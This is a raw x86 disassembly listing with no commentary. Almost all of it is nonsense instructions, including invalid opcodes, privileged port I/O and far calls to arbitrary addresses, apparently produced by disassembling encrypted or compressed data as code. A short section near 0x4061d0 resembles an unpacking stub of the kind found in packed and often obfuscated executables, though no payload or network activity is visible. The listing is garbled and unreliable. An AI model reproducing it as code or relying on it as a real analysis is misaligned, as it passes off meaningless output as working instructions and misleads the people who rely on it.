  406103:	mov    ds,WORD PTR ds:[ebp-0x43]
  406107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406108:	push   esi
  406109:	dec    eax
  40610a:	mov    esi,0x92df6c4f
  40610f:	loopne 0x4060a2
  406111:	push   0x934f71d6
  406116:	in     al,0xb5
  406118:	shl    BYTE PTR [esi*2+0x4e713b31],0x3
  406120:	fcmovne st,st(0)
  406122:	mov    DWORD PTR [ecx+0x447c4c8f],0xea8ede9a
  40612c:	sar    al,cl
  40612e:	cdq    
  40612f:	cmp    dh,BYTE PTR [edi+edx*8]
  406132:	inc    edx
  406133:	call   DWORD PTR [edi*1-0xe26dd7d]
  40613a:	sti    
  40613b:	rol    DWORD PTR [edi],0x6a
  40613e:	(bad)  
  40613f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406140:	jecxz  0x4061b8
  406142:	outs   dx,BYTE PTR ds:[esi]
  406143:	ret    0xb027
  406146:	sbb    al,0xea
  406148:	dec    esp
  406149:	jge    0x40611e
  40614b:	push   esi
  40614c:	sar    esp,1
  40614e:	cmp    eax,0x3e8dc23a
  406153:	ins    DWORD PTR es:[edi],dx
  406154:	adc    BYTE PTR [eax-0x62],0xc2
  406158:	mul    BYTE PTR ds:0x2487b7f7
  40615e:	cmp    al,BYTE PTR [ebp-0x6cc4d095]
  406164:	mov    edx,0x3a2746c9
  406169:	or     ch,BYTE PTR [ecx]
  40616b:	xchg   edx,eax
  40616c:	aad    0xb3
  40616e:	outs   dx,DWORD PTR ds:[esi]
  40616f:	mov    ah,0xe7
  406171:	mov    al,ds:0x2c4e7107
  406176:	adc    BYTE PTR [esi+eax*8],dh
  406179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40617a:	inc    ebp
  40617b:	(bad)  
  40617d:	out    0x8f,al
  40617f:	pop    es
  406180:	adc    BYTE PTR [ecx+0xf],cl
  406183:	pop    eax
  406184:	xchg   BYTE PTR [esi-0x58],ah
  406187:	dec    esp
  406188:	or     al,0x9c
  40618a:	adc    cl,BYTE PTR [eax+ecx*4+0x4d]
  40618e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40618f:	imul   eax,DWORD PTR [edx+ebp*4-0x7162e445],0x9
  406197:	mov    bl,0x46
  406199:	add    DWORD PTR [ecx+0x8],esp
  40619c:	(bad)  
  40619d:	ja     0x406180
  40619f:	lods   al,BYTE PTR ds:[esi]
  4061a0:	pop    esp
  4061a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061a2:	arpl   WORD PTR [esi+0xb],dx
  4061a5:	lods   al,BYTE PTR ds:[esi]
  4061a6:	jecxz  0x40620e
  4061a8:	push   esi
  4061a9:	jns    0x4061bc
  4061ab:	icebp  
  4061ac:	jg     0x4061bf
  4061ae:	push   0xedc2b527
  4061b3:	and    edx,DWORD PTR [ecx+0x18]
  4061b6:	push   ebx
  4061b7:	or     cl,BYTE PTR [eax+0x72f61984]
  4061bd:	xor    al,BYTE PTR [eax]
  4061bf:	mov    eax,DWORD PTR [ebp+0xc]
  4061c2:	xor    eax,esi
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x428ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x428ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x428ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x428ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x42aa3b
  406209:	cmp    DWORD PTR ds:0x428ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x428e23
  406223:	adc    DWORD PTR ds:0x428e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	pushf  
  40623b:	and    BYTE PTR ds:0x833d0b5e,ch
  406241:	xor    ecx,0x60
  406244:	add    DWORD PTR [ebx-0x77691317],0xfffffff1
  40624b:	retfw  0x159
  40624f:	icebp  
  406250:	mov    ds,WORD PTR [edx+ecx*1]
  406253:	xlat   BYTE PTR ds:[ebx]
  406254:	push   edx
  406255:	fucom  st(2)
  406257:	inc    ebp
  406258:	lods   eax,DWORD PTR ds:[esi]
  406259:	inc    ebp
  40625a:	adc    al,0x82
  40625c:	mov    bl,0xee
  40625e:	clc    
  40625f:	cmp    eax,0x59a3796f
  406264:	loop   0x40622b
  406266:	inc    esp
  406267:	shl    BYTE PTR [edx-0x72bcb35],1
  40626d:	stos   BYTE PTR es:[edi],al
  40626e:	popf   
  40626f:	xor    bh,BYTE PTR [eax-0x60]
  406272:	popf   
  406273:	movsx  ecx,ch
  406276:	cmp    cl,0xe7
  406279:	add    esp,DWORD PTR [esi-0xba3e7b3]
  40627f:	mov    edx,esp
  406281:	jns    0x406268
  406283:	call   0x2b9e:0xababff8c
  40628a:	lea    ebx,[edi+edx*4-0x47]
  40628e:	pushf  
  40628f:	and    al,0xea
  406291:	adc    al,0x6f
  406293:	mov    ebp,?
  406295:	test   eax,0xa9355e0c
  40629a:	test   ah,cl
  40629c:	outs   dx,DWORD PTR ds:[esi]
  40629d:	jbe    0x4062ed
  40629f:	call   0x9f3427c3
  4062a4:	sahf   
  4062a5:	out    dx,al
  4062a6:	jno    0x4062b2
  4062a8:	xchg   ebx,eax
  4062a9:	and    eax,0x7aec2dc1
  4062ae:	xor    DWORD PTR [esi+0x3f],edi
  4062b1:	xor    al,0xb3
  4062b3:	jecxz  0x4062a8
  4062b5:	inc    ebx
  4062b6:	jge    0x406262
  4062b8:	inc    eax
  4062b9:	out    dx,al
  4062ba:	sbb    cl,ah
  4062bc:	rcl    esp,1
  4062be:	sti    
  4062bf:	mov    ss,WORD PTR [edx]
  4062c1:	cwde   
  4062c2:	mov    bl,BYTE PTR [eax+0x4c17eb5b]
  4062c8:	xchg   DWORD PTR [ecx+0x24],ecx
  4062cb:	xor    bh,0x23
  4062ce:	mov    ds:0x60c66b73,eax
  4062d3:	mov    bh,0xaf
  4062d5:	xchg   esp,eax
  4062d6:	mov    cs,WORD PTR [edx+0x4d]
  4062d9:	into   
  4062da:	cld    
  4062db:	sbb    al,0x89
  4062dd:	lods   eax,DWORD PTR ds:[esi]
  4062de:	sub    ch,BYTE PTR [esi+0x37]
  4062e1:	fcom   DWORD PTR [esi]
  4062e3:	add    ecx,DWORD PTR [ebx-0x403ed7fd]
  4062e9:	dec    esi
  4062ea:	(bad)  
  4062eb:	mov    dl,0xc1
  4062ed:	mov    DWORD PTR [eax+0x31],0x4ec31726
  4062f4:	lahf   
  4062f5:	and    eax,0x743ab916
  4062fa:	iret   
  4062fb:	stc    
  4062fc:	jp     0x4062bf
  4062fe:	or     al,0xb4
  406300:	xor    bl,BYTE PTR [eax-0x20de7eda]
  406306:	xchg   esp,eax
  406307:	loope  0x4062c9
  406309:	sbb    ebp,DWORD PTR [edx]
  40630b:	push   cs
  40630c:	add    BYTE PTR [ecx+0x7b1c3f66],0x49
  406313:	ffreep st(2)
  406315:	repnz cmp edi,edx
  406318:	mov    dl,0xe3
  40631a:	or     al,0x57
  40631c:	sbb    eax,0x2f5d8135
  406321:	jle    0x40636e
  406323:	xchg   edx,eax
  406324:	cmp    al,0x1b
  406326:	pusha  
  406327:	push   eax
  406328:	jp     0x4062c1
  40632a:	inc    ecx
  40632b:	jl     0x4062fb
  40632d:	retf   
  40632e:	fucomi st,st(0)
  406330:	jmp    0xabde2c45
  406335:	lods   eax,DWORD PTR ds:[esi]
  406336:	sti    
  406337:	jp     0x40636f
  406339:	cmp    eax,0xa2fb4400
  40633e:	pop    esi
  40633f:	stos   BYTE PTR es:[edi],al
  406340:	push   ds
  406341:	sbb    esp,ebx
  406343:	or     eax,0xb59d021c
  406348:	mov    ebp,0xdb5d31a8
  40634d:	pop    es
  40634e:	div    BYTE PTR [esi+eiz*4]
  406351:	and    BYTE PTR [ecx-0x4d],cl
  406354:	fiadd  WORD PTR [esp+ebx*4+0x4e0b2cb]
  40635b:	push   ecx
  40635c:	inc    esi
  40635d:	rol    BYTE PTR cs:[edx],0xfd
  406361:	xor    DWORD PTR [esi-0x191afae1],ebp
  406367:	cmp    eax,0x3d643cea
  40636c:	jbe    0x406370
  40636e:	int3   
  40636f:	mov    ecx,ebx
  406371:	mov    ch,0x19
  406373:	sbb    DWORD PTR [ebp-0x2c],esp
  406376:	jg     0x406358
  406378:	fld    QWORD PTR [edx+0x745de3f5]
  40637e:	pop    ebx
  40637f:	cs jbe 0x406310
  406382:	dec    esp
  406383:	ss in  eax,dx
  406385:	inc    edi
  406386:	ret    0x1af0
  406389:	fild   WORD PTR [edx-0x77]
  40638c:	xchg   edi,eax
  40638d:	loop   0x406344
  40638f:	fiadd  WORD PTR [edx-0x56]
  406392:	push   ds
  406393:	sbb    ebx,DWORD PTR [edx-0x52]
  406396:	mov    al,ds:0x7d2e1bba
  40639b:	and    DWORD PTR [esi-0x5372db66],edx
  4063a1:	and    ecx,ebx
  4063a3:	loop   0x406403
  4063a5:	xor    BYTE PTR [esi+0x6938a824],bl
  4063ab:	cli    
  4063ac:	xor    eax,0x22d9e9ab
  4063b1:	pop    ecx
  4063b2:	sbb    bl,ah
  4063b4:	call   DWORD PTR [ebx+0x7432158d]
  4063ba:	jge    0x40643a
  4063bc:	sub    al,0xcd
  4063be:	rcr    DWORD PTR ds:0x78f4a67d,cl
  4063c4:	call   0x7a91f42
  4063c9:	sahf   
  4063ca:	sti    
  4063cb:	jnp    0x4063bc
  4063cd:	xchg   edx,eax
  4063ce:	jne    0x4063c1
  4063d0:	ret    0x7e19
  4063d3:	and    ebp,esp
  4063d5:	rcl    DWORD PTR [esp+ebp*1-0x34],cl
  4063d9:	arpl   bp,di
  4063db:	jmp    0x406367
  4063dd:	or     BYTE PTR [ebx+ecx*1+0x9],al
  4063e1:	jp     0x406373
  4063e3:	xchg   ebx,eax
  4063e4:	and    eax,0x8c7bfbb0
  4063e9:	into   
  4063ea:	dec    edi
  4063eb:	ds mov ebp,0xf630dd64
  4063f1:	outs   dx,BYTE PTR ds:[esi]
  4063f2:	cdq    
  4063f3:	ss hlt 
  4063f5:	dec    esi
  4063f6:	mov    edx,0xd7cc463e
  4063fb:	cdq    
  4063fc:	and    bl,bl
  4063fe:	mov    ebp,0x5d3050d
  406403:	mov    esi,0x2b5949da
  406408:	mov    eax,ds:0xe3714018
  40640d:	inc    ebp
  40640e:	adc    BYTE PTR [ecx],ah
  406410:	push   ebp
  406411:	cmp    DWORD PTR [esi+0x49380d3e],esp
  406417:	xchg   ebp,eax
  406418:	ds sahf 
  40641a:	enter  0xc233,0x9f
  40641e:	test   al,0x98
  406420:	mov    ds:0x5bc00d7b,al
  406425:	sbb    DWORD PTR [eax+0x7b],eax
  406428:	js     0x406410
  40642a:	pop    ecx
  40642b:	jbe    0x4063fa
  40642d:	arpl   dx,ax
  40642f:	or     eax,0xfe3d26de
  406434:	lea    ebp,[esi-0x5c]
  406437:	push   eax
  406438:	loope  0x406461
  40643a:	adc    eax,0xb981737a
  40643f:	xchg   ebp,eax
  406440:	mov    edx,0xea605bf5
  406445:	cld    
  406446:	repz inc esp
  406448:	ja     0x406447
  40644a:	sbb    al,0xc5
  40644c:	push   esi
  40644d:	xchg   BYTE PTR [ebp-0x3f],al
  406450:	aas    
  406451:	pop    ebx
  406452:	and    DWORD PTR [ebx+ecx*2-0x7fc42aa2],ebx
  406459:	xchg   edi,eax
  40645a:	sbb    ah,BYTE PTR [ecx-0x58858517]
  406460:	inc    esi
  406461:	sub    dh,BYTE PTR [ebx+0x77]
  406464:	fadd   st,st(4)
  406466:	mov    dh,0xee
  406468:	dec    esp
  406469:	cmc    
  40646a:	sar    BYTE PTR [ebp-0x1551f86a],0x1f
  406471:	test   DWORD PTR [edi],edx
  406473:	xchg   ecx,eax
  406474:	and    BYTE PTR [edi+0x65],dl
  406477:	test   eax,0xcf610be2
  40647c:	jns    0x4064dc
  40647e:	mov    edi,0xedb03062
  406483:	shl    BYTE PTR [edx+0x7ee02f1f],cl
  406489:	js     0x4064da
  40648b:	and    DWORD PTR [eax+0x712a07af],ebp
  406491:	cmp    BYTE PTR [edx+0x6569b280],ch
  406497:	adc    al,0xc0
  406499:	loope  0x40646c
  40649b:	sti    
  40649c:	pop    ds
  40649d:	popf   
  40649e:	shl    DWORD PTR [edi+0x3bb120ae],cl
  4064a4:	mov    ebx,0xfc6e3a10
  4064a9:	test   eax,0xbea44bfe
  4064ae:	mov    eax,ds:0x2854855c
  4064b3:	jp     0x40651f
  4064b5:	pop    ebp
  4064b6:	xor    ecx,DWORD PTR [edx+0x3c]
  4064b9:	mov    al,0xa8
  4064bb:	mov    ds:0xcadbbe3d,al
  4064c0:	mov    bh,BYTE PTR [ebx]
  4064c2:	pop    ebp
  4064c3:	sub    al,0x42
  4064c5:	neg    ah
  4064c7:	adc    BYTE PTR [ebx+0x4c],0xaa
  4064cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064cc:	xchg   ebx,eax
  4064cd:	mov    BYTE PTR [edx],bl
  4064cf:	jl     0x40649a
  4064d1:	sub    BYTE PTR [ecx+0x7300dde8],cl
  4064d7:	iret   
  4064d8:	and    DWORD PTR [edi+0x49],edx
  4064db:	cmp    eax,0xd01e05be
  4064e0:	jg     0x406530
  4064e2:	mov    esp,0xbf402007
  4064e7:	int3   
  4064e8:	xchg   ebx,eax
  4064e9:	ret    
  4064ea:	adc    BYTE PTR [eax-0x78],bl
  4064ed:	dec    esi
  4064ee:	or     al,0x61
  4064f0:	(bad)  
  4064f1:	cld    
  4064f2:	arpl   WORD PTR [ebp-0xc],bx
  4064f5:	jecxz  0x406536
  4064f7:	xchg   ebp,eax
  4064f8:	sbb    BYTE PTR ds:[eax+0x23],ah
  4064fc:	sbb    dh,BYTE PTR [esi+0x2978e23f]
  406502:	mov    ah,0x4e
  406504:	jmp    0x41df:0x47106d91
  40650b:	add    al,0x82
  40650d:	repz js 0x40650b
  406510:	jg     0x406524
  406512:	aad    0x68
  406514:	jmp    0x337ecbb2
  406519:	fidiv  WORD PTR [eax]
  40651b:	pop    edi
  40651c:	lods   eax,DWORD PTR ds:[esi]
  40651d:	popf   
  40651e:	cmc    
  40651f:	inc    eax
  406520:	mov    ecx,0xcc37abc0
  406525:	(bad)  
  406527:	repnz xor eax,DWORD PTR [eax+edx*1-0x13594d74]
  40652f:	test   eax,0x15d15d8f
  406534:	push   esp
  406535:	repnz fidiv WORD PTR [ebx]
  406538:	jo     0x406558
  40653a:	ret    0x387e
  40653d:	outs   dx,DWORD PTR ds:[esi]
  40653e:	int3   
  40653f:	mov    ds:0x37df457f,eax
  406544:	gs jl  0x406510
  406547:	lahf   
  406548:	mov    bh,0x27
  40654a:	gs mov edi,ebx
  40654d:	stc    
  40654e:	jp     0x40653c
  406550:	idiv   BYTE PTR [eax+0x16]
  406553:	loop   0x406589
  406555:	cmp    BYTE PTR [ebx],ah
  406557:	clc    
  406558:	scas   eax,DWORD PTR es:[edi]
  406559:	(bad)  
  40655a:	xlat   BYTE PTR ds:[ebx]
  40655b:	dec    ebp
  40655c:	or     ecx,DWORD PTR [eax+0x4e]
  40655f:	fs call 0xafcd:0xfd6155da
  406567:	xor    bh,BYTE PTR [edi+0x62]
  40656a:	jo     0x406580
  40656c:	cmp    eax,0x906a0813
  406571:	adc    esi,edi
  406573:	pop    ss
  406574:	fs jp  0x406540
  406577:	sbb    BYTE PTR [eax-0x29],cl
  40657a:	inc    edx
  40657b:	outs   dx,BYTE PTR ds:[esi]
  40657c:	outs   dx,BYTE PTR ds:[esi]
  40657d:	xchg   edx,eax
  40657e:	push   esi
  40657f:	sti    
  406580:	mov    ah,0xaf
  406582:	pop    ss
  406583:	sar    BYTE PTR [ecx],1
  406585:	test   BYTE PTR [esi+edi*4+0x10152b39],ch
  40658c:	push   esp
  40658d:	fst    DWORD PTR [esi+0x29]
  406590:	(bad)  
  406591:	push   ss
  406592:	mov    dh,0x55
  406594:	lds    edx,FWORD PTR [esi+0x1cdfc8cf]
  40659a:	mov    ebp,0xd66aa2e
  40659f:	inc    ebp
  4065a0:	in     eax,0x9
  4065a2:	nop
  4065a3:	mov    esi,0xca3e74e1
  4065a8:	pop    ecx
  4065a9:	test   dh,ch
  4065ab:	ja     0x4065e0
  4065ad:	mov    al,0xe5
  4065af:	push   ebp
  4065b0:	inc    ebp
  4065b1:	arpl   WORD PTR [ecx+eax*4],bp
  4065b4:	fisttp QWORD PTR [edi+0x4cdd2efa]
  4065ba:	lods   eax,DWORD PTR ds:[esi]
  4065bb:	mov    ebp,0x8b53163e
  4065c0:	mov    cl,0xdc
  4065c2:	imul   edi,DWORD PTR [eax+0x1ed52ab2],0x3a
  4065c9:	xchg   esp,eax
  4065ca:	pop    edx
  4065cb:	and    al,0x76
  4065cd:	icebp  
  4065ce:	xor    esp,eax
  4065d0:	fiadd  DWORD PTR [esi-0x11e6f4b4]
  4065d6:	ja     0x40658b
  4065d8:	dec    ecx
  4065d9:	xchg   esi,eax
  4065da:	stos   BYTE PTR es:[edi],al
  4065db:	stos   BYTE PTR es:[edi],al
  4065dc:	mov    al,0xf0
  4065de:	cmp    BYTE PTR [edx+0x22],bh
  4065e1:	retf   0x2c32
  4065e4:	sbb    bl,BYTE PTR [ecx+0x7b]
  4065e7:	data16 int 0xaf
  4065ea:	xchg   ecx,eax
  4065eb:	mov    ss,WORD PTR [ebx-0x1840619a]
  4065f1:	xchg   ecx,eax
  4065f2:	(bad)  
  4065f3:	ds cli 
  4065f5:	xor    BYTE PTR [ecx+0x43],cl
  4065f8:	and    edx,ebp
  4065fa:	pusha  
  4065fb:	pushf  
  4065fc:	test   al,0x44
  4065fe:	sbb    al,0xc4
  406600:	cwde   
  406601:	sub    BYTE PTR [ebp-0x78062c65],dh
  406607:	test   al,0xae
  406609:	rcl    DWORD PTR [esi],1
  40660b:	sbb    esp,DWORD PTR [esi]
  40660d:	add    DWORD PTR [esi],ebp
  40660f:	icebp  
  406610:	scas   al,BYTE PTR es:[edi]
  406611:	out    0xf4,eax
  406613:	xor    al,0x44
  406615:	fisub  DWORD PTR ds:0x3483b0c9
  40661b:	call   0x827e:0xdf33b7dd
  406622:	fs inc ebx
  406624:	push   es
  406625:	add    eax,0xdb943dfc
  40662a:	add    BYTE PTR [edx-0x64],0xb8
  40662e:	in     al,dx
  40662f:	sub    BYTE PTR [edx+0xe672f12],cl
  406635:	xchg   ebp,eax
  406636:	iret   
  406637:	stos   BYTE PTR es:[edi],al
  406638:	jno    0x40663d
  40663a:	adc    eax,0x35fae015
  40663f:	mov    cl,BYTE PTR ds:0x9e7d8cde
  406645:	cmp    BYTE PTR [ecx+ecx*4],bl
  406648:	test   eax,0x8408f667
  40664d:	ss pushf 
  40664f:	test   al,0xa6
  406651:	xor    BYTE PTR [ebp-0x14],dh
  406654:	add    ah,BYTE PTR [eax]
  406656:	jmp    0x9527eacb
  40665b:	pop    eax
  40665c:	or     ch,BYTE PTR [esi-0x62926e32]
  406662:	adc    DWORD PTR [eax-0x53e57462],edi
  406668:	xlat   BYTE PTR ds:[ebx]
  406669:	adc    eax,0xa0181e5e
  40666e:	jb     0x4066a3
  406670:	inc    esp
  406671:	pushf  
  406672:	cwde   
  406673:	lahf   
  406674:	sub    DWORD PTR [ebx-0x59],ecx
  406677:	jno    0x4066aa
  406679:	sbb    dl,ah
  40667b:	inc    eax
  40667c:	dec    ebp
  40667d:	mov    ds:0x3d45db19,eax
  406682:	cwde   
  406683:	(bad)
  406686:	dec    edi
  406687:	push   edx
  406688:	aaa    
  406689:	jns    0x4066e8
  40668b:	push   esp
  40668c:	mov    ah,BYTE PTR [ecx-0x188e5cb9]
  406692:	xor    DWORD PTR [edi-0x54],ebx
  406695:	cli    
  406696:	jno    0x40669e
  406698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406699:	mov    WORD PTR [ebp-0x1d890311],fs
  40669f:	lock xchg edi,eax
  4066a1:	lea    edx,[edi-0x32]
  4066a4:	arpl   WORD PTR [esi-0x3b],cx
  4066a7:	es dec esi
  4066a9:	jae    0x406713
  4066ab:	sbb    ch,cl
  4066ad:	sub    ecx,esi
  4066af:	dec    ecx
  4066b0:	pop    eax
  4066b1:	iret   
  4066b2:	pop    ebx
  4066b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066b4:	int    0x40
  4066b6:	inc    esi
  4066b7:	das    
  4066b8:	test   DWORD PTR [edx+eiz*4],ebx
  4066bb:	scas   al,BYTE PTR es:[edi]
  4066bc:	push   ebp
  4066bd:	or     al,0x2e
  4066bf:	jge    0x4066aa
  4066c1:	push   es
  4066c2:	or     eax,0xcdf807b5
  4066c7:	test   ch,dh
  4066c9:	xor    ah,BYTE PTR [ebp+0x45fe80b2]
  4066cf:	icebp  
  4066d0:	push   edi
  4066d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066d2:	je     0x40666c
  4066d4:	call   0x9a4f:0x1df97ff4
  4066db:	loopne 0x40669b
  4066dd:	adc    dl,BYTE PTR [bp+di-0x45]
  4066e1:	jo     0x406721
  4066e3:	test   DWORD PTR [ebx-0x229dd72d],eax
  4066e9:	mov    ?,WORD PTR [eax-0xa6619be]
  4066ef:	out    dx,eax
  4066f0:	mov    ?,esi
  4066f2:	dec    edx
  4066f3:	cmc    
  4066f4:	add    ebp,DWORD PTR [eax-0x6626e625]
  4066fa:	mov    edx,0x7aa1c47a
  4066ff:	jnp    0x40670c
  406701:	xlat   BYTE PTR ds:[ebx]
  406702:	iret   
  406703:	mov    eax,ds:0x1d2c352f
  406708:	mov    DWORD PTR [edx],ecx
  40670a:	ins    DWORD PTR es:[edi],dx
  40670b:	out    dx,eax
  40670c:	mov    cl,0x60
  40670e:	fwait
  40670f:	push   eax
  406710:	xchg   esp,eax
  406711:	hlt    
  406712:	xchg   ebx,eax
  406713:	pushf  
  406714:	cmp    BYTE PTR [esi],ch
  406716:	fwait
  406717:	xor    eax,0xdf75bb10
  40671c:	pop    DWORD PTR [ebx]
  40671e:	mov    dh,0x61
  406720:	jnp    0x406787
  406722:	mov    esp,0x53645d2b
  406727:	mul    DWORD PTR [esi+0x37149a0b]
  40672d:	sub    dl,ah
  40672f:	add    bh,BYTE PTR ds:0xf6437a0e
  406735:	clc    
  406736:	lock adc DWORD PTR [edx+edx*1-0x21a166f9],esp
  40673e:	jae    0x40673a
  406740:	test   BYTE PTR [ebp-0x7c],dl
  406743:	rol    bh,1
  406745:	ret    
  406746:	pop    edi
  406747:	jbe    0x4066d6
  406749:	call   0xc9e7:0xd479280b
  406750:	test   BYTE PTR [ecx],0x7e
  406753:	das    
  406754:	pop    ds
  406755:	jno    0x40678b
  406757:	sbb    al,dh
  406759:	mov    esp,0xc290a90
  40675e:	fld    DWORD PTR [eax]
  406760:	mov    ah,0xb8
  406762:	sub    al,0xa7
  406764:	call   0xf08822a2
  406769:	xor    DWORD PTR [eax-0x2f56b0b6],ebx
  40676f:	das    
  406770:	ret    
  406771:	mov    eax,0xa732f124
  406776:	or     DWORD PTR [ebx+0x5e1fd70e],eax
  40677c:	jbe    0x4067cf
  40677e:	dec    esp
  40677f:	mov    BYTE PTR [ebx],dh
  406781:	repnz xchg edx,eax
  406783:	sbb    ecx,ebp
  406785:	add    bl,dh
  406787:	push   0x4d9c688e
  40678c:	fistp  WORD PTR [ecx]
  40678e:	in     eax,0x8c
  406790:	cmp    DWORD PTR [esi-0x3],0x36
  406794:	cmp    esi,esp
  406796:	stc    
  406797:	and    edi,ecx
  406799:	xor    BYTE PTR [ecx+0x1e5cc3e7],0x1f
  4067a0:	in     al,0xe8
  4067a2:	push   eax
  4067a3:	outs   dx,DWORD PTR ds:[esi]
  4067a4:	popf   
  4067a5:	or     bh,al
  4067a7:	jecxz  0x406731
  4067a9:	es into 
  4067ab:	out    0x2a,eax
  4067ad:	jecxz  0x40682c
  4067af:	jmp    0x40675c
  4067b1:	stos   DWORD PTR es:[edi],eax
  4067b2:	pop    edx
  4067b3:	mov    bh,0x3c
  4067b5:	mov    dh,0xcf
  4067b7:	lds    edi,FWORD PTR [ecx]
  4067b9:	mov    esi,0x7aabefe0
  4067be:	push   es
  4067bf:	jge    0x4067be
  4067c1:	fwait
  4067c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067c3:	jbe    0x40680e
  4067c5:	inc    edi
  4067c6:	adc    ah,BYTE PTR [edi]
  4067c8:	sbb    eax,0x98fba826
  4067cd:	test   BYTE PTR [eax+0x3d],dl
  4067d0:	(bad)  
  4067d2:	push   ebx
  4067d3:	and    eax,0x20f90c8c
  4067d8:	das    
  4067d9:	stos   DWORD PTR es:[edi],eax
  4067da:	addr16 sbb ah,al
  4067dd:	test   BYTE PTR [eax-0xf],0xc
  4067e1:	dec    edi
  4067e2:	lock and eax,0xbb37c6db
  4067e8:	pop    esi
  4067e9:	xchg   DWORD PTR ds:0x7cc15c3d,edi
  4067ef:	lods   al,BYTE PTR ds:[esi]
  4067f0:	dec    edi
  4067f1:	mov    DWORD PTR [ecx-0x2],edi
  4067f4:	cdq    
  4067f5:	jns    0x4067a8
  4067f7:	inc    edi
  4067f8:	adc    al,0xbf
  4067fa:	aaa    
  4067fb:	(bad)  
  4067fc:	mov    esp,0x204cea08
  406801:	das    
  406802:	pop    edi
  406803:	push   0x1a439585
  406808:	adc    bh,bh
  40680a:	jae    0x4067a8
  40680c:	add    eax,0xc7c163a
  406811:	das    
  406812:	(bad)  
  406813:	aas    
  406814:	lock mov BYTE PTR [ebx-0x55],0x54
  406819:	repz inc edi
  40681b:	mov    ds:0xcba4fbec,eax
  406820:	mov    BYTE PTR [ecx+0x7d],dh
  406823:	popf   
  406824:	jecxz  0x4067fc
  406826:	scas   eax,DWORD PTR es:[edi]
  406827:	inc    esi
  406828:	les    ecx,FWORD PTR [edx+0x26]
  40682b:	fst    DWORD PTR [ebp-0x3a]
  40682e:	(bad)  
  40682f:	and    al,0xa8
  406831:	push   ebx
  406832:	mov    edi,DWORD PTR [esi-0x7f]
  406835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406836:	sahf   
  406837:	pop    edx
  406838:	loope  0x40686e
  40683a:	cmp    ebp,DWORD PTR cs:[ebx-0x493d4b09]
  406841:	cli    
  406842:	scas   eax,DWORD PTR es:[edi]
  406843:	scas   al,BYTE PTR es:[edi]
  406844:	mov    ebx,0xc3317b96
  406849:	or     al,0x3b
  40684c:	test   bl,al
  40684e:	imul   eax,ecx,0x39dd64f6
  406854:	push   DWORD PTR [edi]
  406856:	out    dx,al
  406857:	add    BYTE PTR [ebp+eiz*1+0x74],0xc1
  40685c:	ja     0x406803
  40685e:	sub    eax,0x8ac98d42
  406863:	outs   dx,DWORD PTR ds:[esi]
  406864:	rcl    DWORD PTR [eax],1
  406866:	sub    ah,BYTE PTR [edi+0x1beae11]
  40686c:	cmc    
  40686d:	inc    edi
  40686e:	push   0xf1a3d19
  406873:	inc    ecx
  406874:	nop
  406875:	pusha  
  406876:	mov    ecx,DWORD PTR [edi+0xd8864db]
  40687c:	pop    ss
  40687d:	sbb    al,0x84
  40687f:	xchg   esi,eax
  406880:	pop    edx
  406881:	fisttp QWORD PTR [ecx+esi*1]
  406884:	iret   
  406885:	popf   
  406886:	mov    ds:0xfed76b5f,al
  40688b:	cld    
  40688c:	out    0x57,al
  40688e:	leave  
  40688f:	xor    ecx,DWORD PTR [edi]
  406891:	add    ecx,DWORD PTR [edi+0x7c]
  406894:	xchg   esp,esp
  406896:	lock or dh,BYTE PTR [edx-0x7e]
  40689a:	sbb    ebp,DWORD PTR [eax+ecx*4+0x3344e588]
  4068a1:	bound  edi,QWORD PTR [edi-0x2d]
  4068a4:	inc    esi
  4068a5:	push   es
  4068a6:	add    BYTE PTR [eax-0x6e],cl
  4068a9:	sar    BYTE PTR [ebx-0x11],0x67
  4068ad:	jmp    0x27af:0x4391c3f5
  4068b4:	sahf   
  4068b5:	pop    ebp
  4068b6:	dec    esp
  4068b7:	sbb    esp,DWORD PTR ds:0x9c7dd40d
  4068bd:	jb     0x406910
  4068bf:	mov    al,ds:0x739c2507
  4068c4:	xchg   ecx,eax
  4068c5:	sar    DWORD PTR [edi+0x2],1
  4068c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068c9:	repnz xlat BYTE PTR es:[ebx]
  4068cc:	sbb    eax,ebx
  4068ce:	hlt    
  4068cf:	nop
  4068d0:	fisttp WORD PTR [esi]
  4068d2:	inc    ebx
  4068d3:	clc    
  4068d4:	cmp    ebp,0x18
  4068d7:	and    al,0x78
  4068d9:	outs   dx,BYTE PTR ds:[esi]
  4068da:	xor    dl,BYTE PTR [ecx-0xc]
  4068dd:	sbb    DWORD PTR [edi+eax*1+0x6f],esi
  4068e1:	fst    st(6)
  4068e3:	or     bh,BYTE PTR [eax-0x78345e7e]
  4068e9:	xor    eax,0x5f788cf
  4068ee:	push   ds
  4068ef:	mov    ds:0x7c85f910,eax
  4068f4:	mov    DWORD PTR [eax-0x75],ecx
  4068f7:	push   ss
  4068f8:	call   0x30fc:0xc56f6ddc
